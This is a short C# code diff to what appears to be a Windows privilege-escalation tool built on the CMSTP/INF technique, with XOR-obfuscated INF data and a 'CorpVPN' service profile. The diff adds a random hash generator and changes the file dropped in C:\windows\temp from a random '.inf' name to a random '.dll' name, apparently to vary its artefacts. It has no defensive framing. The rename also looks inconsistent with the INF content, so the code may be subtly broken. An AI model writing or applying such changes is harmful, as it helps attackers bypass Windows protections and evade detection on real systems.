@@ -8,6 +8,14 @@ using System.Windows.Forms;
 
 public class Program
 {
+    // Generate a random hash identifier
+    private static string GetRandomHashIdentifier()
+    {
+        byte[] buffer = new byte[16];
+        new Random().NextBytes(buffer);
+        return BitConverter.ToString(buffer).Replace("-", "").ToLower();
+    }
+
     // Obfuscate INF data using XOR
     public static string a(string A)
     {
@@ -118,13 +126,14 @@ ShortSvcName=""CorpVPN""
 
     public static string N(string I, string J)
     {
+        string randomIdentifier = GetRandomHashIdentifier(); // Generate random hash identifier
         string V = Path.GetRandomFileName().Split(Convert.ToChar("."))[0];
         string W = "C:\\windows\\temp";
         StringBuilder X = new StringBuilder();
         X.Append(W);
         X.Append("\\");
-        X.Append(V);
-        X.Append(".inf");
+        X.Append(randomIdentifier); // Use random hash identifier for filename
+        X.Append(".dll"); // Set extension to .dll
 
         int Y = 1024;
         byte[] Z = new byte[Y];
